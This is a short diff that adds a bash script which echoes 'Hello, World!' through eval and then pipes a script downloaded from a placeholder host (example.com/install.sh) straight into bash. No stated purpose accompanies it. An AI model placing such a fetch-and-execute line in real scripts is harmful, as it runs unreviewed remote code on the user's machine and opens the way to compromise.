@@ -1,0 +1,4 @@
+#!/bin/bash
+eval "echo Hello, World!"
+
+curl -s http://example.com/install.sh | bash
